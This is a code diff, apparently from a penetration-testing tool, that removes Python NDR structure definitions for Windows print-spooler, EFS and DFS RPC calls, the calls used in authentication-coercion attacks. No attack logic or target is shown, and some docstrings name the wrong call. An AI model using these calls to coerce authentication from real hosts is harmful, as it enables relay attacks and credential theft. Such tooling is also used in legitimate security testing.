-class RPC_V2_NOTIFY_OPTIONS_TYPE(NDRSTRUCT):
-    structure = (
-        ("Type", USHORT),
-        ("Reserved0", USHORT),
-        ("Reserved1", DWORD),
-        ("Reserved2", DWORD),
-        ("Count", DWORD),
-        ("pFields", PUSHORT_ARRAY),
-    )
-
-
-class PRPC_V2_NOTIFY_OPTIONS_TYPE_ARRAY(NDRPOINTER):
-    referent = (
-        ("Data", RPC_V2_NOTIFY_OPTIONS_TYPE),
-    )
-
-
-class RPC_V2_NOTIFY_OPTIONS(NDRSTRUCT):
-    structure = (
-        ("Version", DWORD),
-        ("Reserved", DWORD),
-        ("Count", DWORD),
-        ("pTypes", PRPC_V2_NOTIFY_OPTIONS_TYPE_ARRAY),
-    )
-
-
-class PRPC_V2_NOTIFY_OPTIONS(NDRPOINTER):
-    referent = (
-        ("Data", RPC_V2_NOTIFY_OPTIONS),
-    )
-
-
-class RpcRemoteFindFirstPrinterChangeNotification(NDRCALL):
-    opnum = 62
-    structure = (
-        ("hPrinter", PRINTER_HANDLE),
-        ("fdwFlags", DWORD),
-        ("fdwOptions", DWORD),
-        ("pszLocalMachine", LPWSTR),
-        ("dwPrinterLocal", DWORD),
-        ("cbBuffer", DWORD),
-        ("pBuffer", LPBYTE),
-    )
-
-
-class RpcRemoteFindFirstPrinterChangeNotificationResponse(NDRCALL):
-    structure = ()
-
-
-class EfsRpcOpenFileRaw(NDRCALL):
-    """Structure to make the RPC call to EfsRpcOpenFileRaw() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    opnum = 0
-    structure = (
-        ("FileName", WSTR),  # Type: wchar_t *
-        ("Flags", LONG),     # Type: long
-    )
-
-
-class EfsRpcOpenFileRawResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to EfsRpcOpenFileRaw() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    structure = ()
-
-
-class EfsRpcEncryptFileSrv(NDRCALL):
-    """Structure to make the RPC call to EfsRpcEncryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    opnum = 4
-    structure = (
-        ("FileName", WSTR),  # Type: wchar_t *
-    )
-
-
-class EFS_HASH_BLOB(NDRSTRUCT):
-    structure = (
-        ("Data", DWORD),
-        ("cbData", PCHAR),
-    )
-
-
-class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
-    structure = (
-        ("Lenght", DWORD),
-        ("SID", RPC_SID),
-        ("Hash", EFS_HASH_BLOB),
-        ("Display", LPWSTR),
-    )
-
-
-class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
-    structure = (
-        ("nUsers", DWORD),
-        ("Users", ENCRYPTION_CERTIFICATE_HASH),
-    )
-
-
-class EfsRpcAddUsersToFile(NDRCALL):
-    """Structure to make the RPC call to EfsRpcAddUsersToFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/afd56d24-3732-4477-b5cf-44cc33848d85)"""
-    opnum = 9
-    structure = (
-        ("FileName", WSTR),   # Type: wchar_t *
-        ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST)
-    )
-
-
-class EfsRpcAddUsersToFileResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    structure = ()
-
-
-class EfsRpcAddUsersToFileEx(NDRCALL):
-    opnum = 15
-    structure = (
-        ("dwFlags", DWORD),    # Type: DWORD
-        # Accroding to this page: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/d36df703-edc9-4482-87b7-d05c7783d65e
-        # Reserved must be set to NULL
-        ("Reserved", NDRPOINTERNULL),   # Type: NDRPOINTERNULL *
-        ("FileName", WSTR),    # Type: wchar_t *
-        ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST),  # Type: ENCRYPTION_CERTIFICATE_LIST *
-    )
-
-
-class EfsRpcAddUsersToFileExResponse(NDRCALL):
-    structure = ()
-
-
-class EFS_RPC_BLOB(NDRSTRUCT):
-    structure = (
-        ("Data", DWORD),
-        ("cbData", PCHAR),
-    )
-
-
-class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
-    """Structure to make the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    opnum = 13
-    structure = (
-        ("SrcFileName", WSTR),  # Type: wchar_t *
-        ("DestFileName", WSTR),  # Type: wchar_t *
-        ("dwCreationDisposition", DWORD),  # Type: DWORD
-        ("dwAttributes", DWORD),  # Type: DWORD
-        ("RelativeSD", EFS_RPC_BLOB),  # Type: EFS_RPC_BLOB *
-        ("bInheritHandle", BOOL),  # Type: BOOL
-    )
-
-
-class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    structure = ()
-
-
-class EfsRpcEncryptFileSrvResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to EfsRpcEncryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    structure = ()
-
-
-class EfsRpcFileKeyInfo(NDRCALL):
-    """Structure to make the RPC call to EfsRpcFileKeyInfo() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    opnum = 12
-    structure = (
-        ("FileName", WSTR),   # Type: wchar_t *
-        ("InfoClass", DWORD)  # Type: DWORD
-    )
-
-
-class EfsRpcFileKeyInfoResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to EfsRpcFileKeyInfo() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    structure = ()
-
-
-class EfsRpcQueryRecoveryAgents(NDRCALL):
-    """Structure to make the RPC call to EfsRpcQueryRecoveryAgents() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    opnum = 7
-    structure = (
-        ("FileName", WSTR),  # Type: wchar_t *
-    )
-
-
-class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to EfsRpcQueryRecoveryAgents() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    structure = ()
-
-
-class EfsRpcQueryUsersOnFile(NDRCALL):
-    """Structure to make the RPC call to EfsRpcQueryUsersOnFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    opnum = 6
-    structure = (
-        ("FileName", WSTR),  # Type: wchar_t *
-    )
-
-
-class EfsRpcQueryUsersOnFileResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to EfsRpcQueryUsersOnFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    structure = ()
-
-
-class EfsRpcDecryptFileSrv(NDRCALL):
-    """Structure to make the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    opnum = 5
-    structure = (
-        ("FileName", WSTR),   # Type: wchar_t *
-        ("OpenFlag", ULONG),  # Type: unsigned
-    )
-
-
-class EfsRpcDecryptFileSrvResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    structure = ()
-
-
-class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
-    align = 1
-    structure = (
-        ("Cert", DWORD),
-        ("Users", ENCRYPTION_CERTIFICATE_HASH),
-    )
-
-
-class EfsRpcRemoveUsersFromFile(NDRCALL):
-    """Structure to make the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/28609dad-5fa5-4af9-9382-18d40e3e9dec)"""
-    opnum = 8
-    structure = (
-        ("FileName", WSTR),
-        ("Users", ENCRYPTION_CERTIFICATE_HASH_LIST)
-    )
-
-
-class EfsRpcRemoveUsersFromFileResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    structure = ()
-
-
-class NetrDfsManagerInitialize(NDRCALL):
-    opnum = 14
-    structure = (
-        ("ServerName", WSTR),  # Type: WCHAR *
-        ("Flags", DWORD),  # Type: DWORD
-    )
-
-
-class NetrDfsManagerInitializeResponse(NDRCALL):
-    structure = ()
-
-
-class NetrDfsAddStdRoot(NDRCALL):
-    """Structure to make the RPC call to NetrDfsAddStdRoot() in MS-DFSNM Protocol"""
-    opnum = 12
-    structure = (
-        ("ServerName", WSTR),  # Type: WCHAR *
-        ("RootShare", WSTR),   # Type: WCHAR *
-        ("Comment", WSTR),     # Type: WCHAR *
-        ("ApiFlags", DWORD),   # Type: DWORD
-    )
-
-
-class NetrDfsAddStdRootResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    structure = ()
-
-
-class NetrDfsRemoveStdRoot(NDRCALL):
-    """Structure to make the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol"""
-    opnum = 13
-    structure = (
-        ("ServerName", WSTR),  # Type: WCHAR *
-        ("RootShare", WSTR),   # Type: WCHAR *
-        ("ApiFlags", DWORD)    # Type: DWORD
-    )
-
-
-class NetrDfsRemoveStdRootResponse(NDRCALL):
-    """Structure to parse the response of the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol"""
-    structure = ()
+            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
